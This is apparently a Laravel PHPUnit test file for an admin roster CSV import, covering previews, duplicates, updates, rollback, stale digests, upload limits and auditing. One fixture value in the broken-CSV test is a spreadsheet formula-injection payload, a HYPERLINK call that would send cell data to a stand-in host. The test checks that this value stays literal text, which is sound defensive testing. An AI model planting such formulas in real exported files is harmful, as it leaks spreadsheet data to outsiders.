<?php

namespace Tests\Feature\Admin;

use App\Models\AuditLog;
use App\Models\Person;
use App\Models\PersonLevel;
use App\Models\User;
use App\Support\Roster\CsvRosterReader;
use App\Support\Roster\RosterImport;
use Database\Seeders\AccessControlSeeder;
use Database\Seeders\ReferenceSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use RuntimeException;
use Tests\TestCase;

/**
 * P1c Task 12 (ST-04, owner decision 3, 2026-08-09). "The first real import must hold no
 * surprises" — the dry-run PREVIEW is the deliverable, not a nicety, and this file proves it:
 * every fixture's preview and commit are checked to AGREE, because `RosterImport::commit()`
 * re-runs the SAME analysis `preview()` calls rather than trusting an earlier estimate.
 */
class RosterImportTest extends TestCase
{
    use RefreshDatabase;

    private const FIXTURES = __DIR__.'/../../fixtures/roster';

    private User $admin;

    /** @var array<string, string> */
    private array $mapping = [
        'full_name' => 'Full Name',
        'short_name' => 'Short Name',
        'email' => 'Email',
        'phone' => 'Phone',
        'position' => 'Position',
        'level' => 'Level',
        'joined_at' => 'Joined',
    ];

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(AccessControlSeeder::class);
        $this->seed(ReferenceSeeder::class);
        $this->admin = User::factory()->create(['position' => 0]);
    }

    protected function tearDown(): void
    {
        // One test registers a temporary Person::saving() listener to force a mid-transaction
        // failure (the same technique UnitMergeTest and PromotionTest use).
        Person::flushEventListeners();
        parent::tearDown();
    }

    private function reader(string $name): CsvRosterReader
    {
        return new CsvRosterReader(self::FIXTURES.'/'.$name);
    }

    private function uploaded(string $name): UploadedFile
    {
        return UploadedFile::fake()->createWithContent($name, (string) file_get_contents(self::FIXTURES.'/'.$name));
    }

    private function fakeRequest(): \Illuminate\Http\Request
    {
        $request = \Illuminate\Http\Request::create('/admin/roster-import/commit', 'POST');
        $request->setUserResolver(fn () => $this->admin);

        return $request;
    }

    // --- clean.csv: the happy path, with one deliberately ambiguous row -------------------

    /**
     * Row 7 (Maha Al-Qahtani) has no email — Person::matchByEmail() returns null for a null
     * address, so an ad-hoc external person would otherwise bypass the only matcher in the
     * system. The preview marks it "no email — cannot be matched" and the commit refuses to
     * auto-create it without an explicit tick; every OTHER row in this "happy path" fixture
     * previews as a clean create.
     */
    public function test_clean_csv_previews_seven_creates_and_one_unconfirmed_row(): void
    {
        $report = RosterImport::preview($this->reader('clean.csv'), $this->mapping);

        $this->assertSame([], $report['file_errors']);
        $this->assertSame(['create' => 7, 'update' => 0, 'skip' => 1, 'error' => 0], $report['summary']);

        $mahaRow = collect($report['rows'])->firstWhere('full_name', 'Maha Al-Qahtani');
        $this->assertSame(RosterImport::SKIP_NO_EMAIL_UNCONFIRMED, $mahaRow['outcome']);
    }

    public function test_a_row_with_no_email_is_skipped_without_confirmation(): void
    {
        $unconfirmed = RosterImport::commit($this->reader('clean.csv'), $this->mapping, [], $this->fakeRequest());

        $this->assertSame(0, Person::where('short_name', 'M. Qahtani')->count());
        $this->assertSame(['created' => 7, 'updated' => 0, 'skipped' => 1], $unconfirmed['summary']);
    }

    public function test_a_row_with_no_email_is_created_once_confirmed(): void
    {
        $report = RosterImport::preview($this->reader('clean.csv'), $this->mapping);
        $position = collect($report['rows'])->search(fn ($r) => $r['full_name'] === 'Maha Al-Qahtani');

        $confirmed = RosterImport::commit($this->reader('clean.csv'), $this->mapping, [$position => true], $this->fakeRequest());

        $this->assertSame(1, Person::where('short_name', 'M. Qahtani')->count());
        $this->assertSame(['created' => 8, 'updated' => 0, 'skipped' => 0], $confirmed['summary']);
    }

    public function test_clean_csv_commits_exactly_eight_people_and_zero_users(): void
    {
        $report = RosterImport::preview($this->reader('clean.csv'), $this->mapping);
        $position = collect($report['rows'])->search(fn ($r) => $r['full_name'] === 'Maha Al-Qahtani');

        $result = RosterImport::commit($this->reader('clean.csv'), $this->mapping, [$position => true], $this->fakeRequest());

        $this->assertSame(['created' => 8, 'updated' => 0, 'skipped' => 0], $result['summary']);
        // 9, not 8: Person::count() also carries the ADMIN's own linked person (P0c — every
        // account has one).
        $this->assertSame(9, Person::count());
        $this->assertSame(1, User::count(), 'Only the admin — the import minted no accounts.');

        $arabic = Person::where('full_name', 'نورة الحربي')->firstOrFail();
        $this->assertSame('noura.harbi@example.test', $arabic->email);
        $this->assertSame(4, $arabic->position); // Resident
        $this->assertSame('R1', $arabic->levelAt()->code);
    }

    /**
     * A second commit of the SAME file, once every row exists, reports updates rather than a
     * second batch of creates — including Maha, now matched by her SHORT NAME (the documented
     * secondary key for a row with no email) rather than by email.
     */
    public function test_a_second_commit_of_clean_csv_is_idempotent_and_reports_updates(): void
    {
        $report = RosterImport::preview($this->reader('clean.csv'), $this->mapping);
        $position = collect($report['rows'])->search(fn ($r) => $r['full_name'] === 'Maha Al-Qahtani');

        RosterImport::commit($this->reader('clean.csv'), $this->mapping, [$position => true], $this->fakeRequest());
        $this->assertSame(9, Person::count());

        $second = RosterImport::commit($this->reader('clean.csv'), $this->mapping, [$position => true], $this->fakeRequest());

        $this->assertSame(['created' => 0, 'updated' => 8, 'skipped' => 0], $second['summary']);
        $this->assertSame(9, Person::count(), 'A second commit must never duplicate a row.');

        $maha = Person::where('short_name', 'M. Qahtani')->firstOrFail();
        $this->assertNull($maha->email, 'Matched by short_name, not created a second time.');
    }

    // --- messy-headers.csv: mapping, not guessing -------------------------------------------

    public function test_messy_headers_csv_produces_the_same_result_as_clean_csv(): void
    {
        $messyMapping = [
            'full_name' => 'full name', 'short_name' => 'Short_Name', 'email' => 'EMAIL',
            'phone' => 'phone', 'position' => 'Position', 'level' => 'level', 'joined_at' => 'joined at',
        ];

        $report = RosterImport::preview($this->reader('messy-headers.csv'), $messyMapping);
        $position = collect($report['rows'])->search(fn ($r) => $r['full_name'] === 'Maha Al-Qahtani');

        RosterImport::commit($this->reader('messy-headers.csv'), $messyMapping, [$position => true], $this->fakeRequest());

        $this->assertSame(9, Person::count());
        $arabic = Person::where('full_name', 'عبدالله القحطاني')->firstOrFail();
        $this->assertSame('abdullah.qahtani@example.test', $arabic->email);
        $this->assertSame('0504444444', $arabic->phone);
        $this->assertSame('R4', $arabic->levelAt()->code);
    }

    // --- duplicate-emails.csv / duplicate-short-names.csv: refused outright ----------------

    public function test_duplicate_emails_csv_is_refused_outright_not_partially_imported(): void
    {
        $preview = RosterImport::preview($this->reader('duplicate-emails.csv'), $this->mapping);
        $this->assertNotEmpty($preview['file_errors']);
        $this->assertStringContainsString('noura@example.test', $preview['file_errors'][0]);

        $commit = RosterImport::commit($this->reader('duplicate-emails.csv'), $this->mapping, [], $this->fakeRequest());
        $this->assertNotEmpty($commit['file_errors']);
        $this->assertSame(1, Person::count(), 'Not "1 of 2 imported" — the whole file is refused (only the admin exists).');
    }

    public function test_duplicate_short_names_csv_is_refused_outright(): void
    {
        $preview = RosterImport::preview($this->reader('duplicate-short-names.csv'), $this->mapping);
        $this->assertNotEmpty($preview['file_errors']);
        $this->assertStringContainsString('A. Ali', $preview['file_errors'][0]);

        $commit = RosterImport::commit($this->reader('duplicate-short-names.csv'), $this->mapping, [], $this->fakeRequest());
        $this->assertNotEmpty($commit['file_errors']);
        $this->assertSame(1, Person::count(), 'Only the admin — nothing written.');
    }

    // --- already-on-roster.csv: an update, not a duplicate ---------------------------------

    public function test_already_on_roster_csv_updates_matched_people_by_email(): void
    {
        $existing = [
            Person::factory()->create(['full_name' => 'H. Mutairi (old)', 'short_name' => null, 'email' => 'existing1@example.test', 'position' => 4]),
            Person::factory()->create(['full_name' => 'Y. Shahri (old)', 'short_name' => null, 'email' => 'existing2@example.test', 'position' => 4]),
            Person::factory()->create(['full_name' => 'N. Subaie (old)', 'short_name' => null, 'email' => 'existing3@example.test', 'position' => 4]),
        ];

        $preview = RosterImport::preview($this->reader('already-on-roster.csv'), $this->mapping);
        $this->assertSame([], $preview['file_errors']);
        $this->assertSame(['create' => 0, 'update' => 3, 'skip' => 0, 'error' => 0], $preview['summary']);

        foreach ($preview['rows'] as $row) {
            $this->assertSame('email', $row['matched_by']);
            $this->assertArrayHasKey('full_name', $row['changes']);
        }

        $result = RosterImport::commit($this->reader('already-on-roster.csv'), $this->mapping, [], $this->fakeRequest());

        $this->assertSame(['created' => 0, 'updated' => 3, 'skipped' => 0], $result['summary']);
        $this->assertSame(4, Person::count(), 'No new rows — the admin plus the SAME three people, updated.');

        $hind = Person::findOrFail($existing[0]->id);
        $this->assertSame('Hind Al-Mutairi', $hind->full_name);
        $this->assertSame('R2', $hind->levelAt()->code);
    }

    // --- collides-with-an-account.csv: reported and skipped, never applied ------------------

    public function test_collides_with_an_account_csv_is_reported_and_skipped(): void
    {
        $holder = User::factory()->create([
            'full_name' => 'Original Holder', 'member_email' => 'account.holder@example.test', 'position' => 3,
        ]);

        $preview = RosterImport::preview($this->reader('collides-with-an-account.csv'), $this->mapping);
        $this->assertSame(['create' => 0, 'update' => 0, 'skip' => 1, 'error' => 0], $preview['summary']);
        $this->assertSame(RosterImport::SKIP_HAS_ACCOUNT, $preview['rows'][0]['outcome']);

        $result = RosterImport::commit($this->reader('collides-with-an-account.csv'), $this->mapping, [], $this->fakeRequest());

        $this->assertSame(['created' => 0, 'updated' => 0, 'skipped' => 1], $result['summary']);
        $this->assertSame('Original Holder', $holder->person->fresh()->full_name,
            'A spreadsheet must not silently rename an account holder.');
        $this->assertSame(2, User::count(), 'The admin plus the pre-seeded holder — no new account.');
        $this->assertSame(2, Person::count());
    }

    // --- broken.csv: file-level AND row-level problems, reported together -------------------

    public function test_broken_csv_reports_the_missing_column_as_file_level_and_everything_else_as_row_level(): void
    {
        $mapping = [
            'full_name' => '', // no such column in this file
            'short_name' => 'Short Name', 'email' => 'Email', 'phone' => 'Phone',
            'position' => 'Position', 'level' => 'Level', 'joined_at' => 'Joined',
        ];

        $preview = RosterImport::preview($this->reader('broken.csv'), $mapping);

        $this->assertNotEmpty($preview['file_errors']);
        $this->assertStringContainsString('Full Name', $preview['file_errors'][0]);
        $this->assertCount(4, $preview['rows']);

        $byShortName = collect($preview['rows'])->keyBy(fn ($r) => $r['values']['short_name'] ?? '');

        $levelRow = $byShortName['S. Level'];
        $this->assertSame(RosterImport::ERROR, $levelRow['outcome']);
        $this->assertTrue(collect($levelRow['errors'])->contains(fn ($e) => str_contains($e, 'PGY7')));

        $dateRow = $byShortName['S. Date'];
        $this->assertTrue(collect($dateRow['errors'])->contains(fn ($e) => str_contains($e, '31/02/2026')));

        $blankRow = collect($preview['rows'])->first(fn ($r) => $r['values'] === []);
        $this->assertSame(RosterImport::ERROR, $blankRow['outcome']);
        $this->assertTrue(collect($blankRow['errors'])->contains(fn ($e) => str_contains($e, 'Blank row')));

        // The formula cell is preserved as LITERAL TEXT in the report — never interpreted.
        $formulaRow = $byShortName['=HYPERLINK("http://x/?"&A1)'];
        $this->assertSame('=HYPERLINK("http://x/?"&A1)', $formulaRow['values']['short_name']);

        $commit = RosterImport::commit($this->reader('broken.csv'), $mapping, [], $this->fakeRequest());
        $this->assertNotEmpty($commit['file_errors']);
        $this->assertSame(1, Person::count(), 'Only the admin — nothing written.');
    }

    // --- the preview never writes ------------------------------------------------------------

    public function test_the_preview_writes_nothing_for_every_fixture(): void
    {
        Person::factory()->create(['email' => 'existing1@example.test']);
        Person::factory()->create(['email' => 'existing2@example.test']);
        Person::factory()->create(['email' => 'existing3@example.test']);
        User::factory()->create(['member_email' => 'account.holder@example.test']);

        $before = [Person::count(), PersonLevel::count(), User::count()];

        foreach (['clean.csv', 'messy-headers.csv', 'duplicate-emails.csv', 'duplicate-short-names.csv',
            'already-on-roster.csv', 'collides-with-an-account.csv'] as $fixture) {
            RosterImport::preview($this->reader($fixture), $this->mapping);
        }

        RosterImport::preview($this->reader('broken.csv'), ['position' => 'Position', 'level' => 'Level', 'joined_at' => 'Joined']);

        $this->assertSame($before, [Person::count(), PersonLevel::count(), User::count()]);
    }

    // --- one transaction ----------------------------------------------------------------------

    public function test_a_forced_failure_partway_through_the_commit_leaves_nothing_written(): void
    {
        Person::saving(function (Person $model): void {
            if ($model->full_name === 'Sara Al-Harbi') {
                throw new RuntimeException('Simulated mid-import failure.');
            }
        });

        try {
            RosterImport::commit($this->reader('clean.csv'), $this->mapping, [], $this->fakeRequest());
            $this->fail('Expected the forced failure to propagate out of commit().');
        } catch (RuntimeException $e) {
            $this->assertSame('Simulated mid-import failure.', $e->getMessage());
        }

        $this->assertSame(1, Person::count(), 'Only the admin — the row created before the forced failure must be rolled back too.');
    }

    // --- HTTP layer: stale preview, oversized upload, audit, never mints a credential --------

    public function test_a_stale_preview_cannot_be_committed(): void
    {
        $this->actingAs($this->admin)->post('/admin/roster-import/preview', [
            'file' => $this->uploaded('clean.csv'),
            'mapping' => json_encode($this->mapping),
        ])->assertSessionHasNoErrors();

        $staleDigest = session('roster_preview')['digest'];

        // Commit with a DIFFERENT file's bytes but the OLD digest.
        $this->actingAs($this->admin)->post('/admin/roster-import/commit', [
            'file' => $this->uploaded('messy-headers.csv'),
            'mapping' => json_encode($this->mapping),
            'confirmations' => json_encode([]),
            'digest' => $staleDigest,
        ])->assertSessionHasErrors('file');

        $this->assertSame(1, Person::count(), 'Only the admin — a digest mismatch must refuse the commit outright.');
    }

    public function test_an_oversized_upload_reports_the_size_not_a_missing_field(): void
    {
        // finding 9: PHP's own behaviour past post_max_size — $_POST/$_FILES come back EMPTY
        // while Content-Length still names the real size the browser sent. Simulated directly:
        // Content-Length is set ABOVE this app's own 4 MB roster-import cap but BELOW the
        // container's 8 MB `post_max_size`, so Laravel's own `ValidatePostSize` middleware (which
        // compares Content-Length against `post_max_size` and would otherwise pre-empt this with
        // a generic 413 before the request even reaches the controller) does not intervene, and
        // the exact empty-$_POST shape reaches `RosterImportRequest` for real.
        $response = $this->actingAs($this->admin)->call(
            'POST',
            '/admin/roster-import/preview',
            [],
            [],
            [],
            array_merge($this->serverVariables ?? [], ['CONTENT_LENGTH' => '6000000']),
        );

        $response->assertSessionHasErrors('file');
        $errors = session('errors')->getBag('default')->get('file');
        $this->assertTrue(
            collect($errors)->contains(fn ($m) => str_contains($m, 'MB') || str_contains($m, 'limit')),
            'Expected a message naming the size limit, got: '.implode(' / ', $errors),
        );
        $this->assertFalse(
            collect($errors)->contains(fn ($m) => str_contains($m, 'field is required')),
            'An oversized upload must not read as "the file field is required".',
        );
    }

    public function test_the_import_is_audited_by_counts_only(): void
    {
        $preview = RosterImport::preview($this->reader('clean.csv'), $this->mapping);
        $position = collect($preview['rows'])->search(fn ($r) => $r['full_name'] === 'Maha Al-Qahtani');

        $this->actingAs($this->admin)->post('/admin/roster-import/preview', [
            'file' => $this->uploaded('clean.csv'),
            'mapping' => json_encode($this->mapping),
        ])->assertSessionHasNoErrors();

        $digest = session('roster_preview')['digest'];

        $this->actingAs($this->admin)->post('/admin/roster-import/commit', [
            'file' => $this->uploaded('clean.csv'),
            'mapping' => json_encode($this->mapping),
            'confirmations' => json_encode([$position => true]),
            'digest' => $digest,
        ])->assertSessionHasNoErrors();

        $log = AuditLog::where('action', 'roster_import')->firstOrFail();
        $this->assertMatchesRegularExpression('/^created=\d+;updated=\d+;skipped=\d+$/', $log->detail);
        $this->assertStringNotContainsString('@', $log->detail);
        $this->assertStringNotContainsString('clean.csv', $log->detail);
    }

    public function test_the_import_never_creates_an_account(): void
    {
        User::factory()->create(['member_email' => 'account.holder@example.test']);

        $preview = RosterImport::preview($this->reader('clean.csv'), $this->mapping);
        $position = collect($preview['rows'])->search(fn ($r) => $r['full_name'] === 'Maha Al-Qahtani');

        RosterImport::commit($this->reader('clean.csv'), $this->mapping, [$position => true], $this->fakeRequest());
        RosterImport::commit($this->reader('collides-with-an-account.csv'), $this->mapping, [], $this->fakeRequest());
        RosterImport::commit($this->reader('already-on-roster.csv'), $this->mapping, [], $this->fakeRequest());

        $this->assertSame(2, User::count(), 'Only the admin plus the ONE pre-seeded account — the import minted none.');
    }
}
